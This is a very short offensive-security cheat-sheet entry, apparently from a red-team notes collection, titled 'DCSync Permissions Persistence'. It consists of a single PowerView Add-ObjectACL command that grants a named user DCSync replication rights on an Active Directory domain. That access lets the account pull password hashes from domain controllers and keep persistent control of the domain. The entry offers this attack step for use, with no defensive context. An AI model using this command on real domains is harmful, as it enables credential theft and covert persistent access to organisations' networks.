# DCSync Permissions Persistence

### 1) Powerview

    Add-ObjectACL -TargetDistinguishedName "DC=Security,DC=local" -PrincipalSamAccountName 'Moe' -Rights DCSync
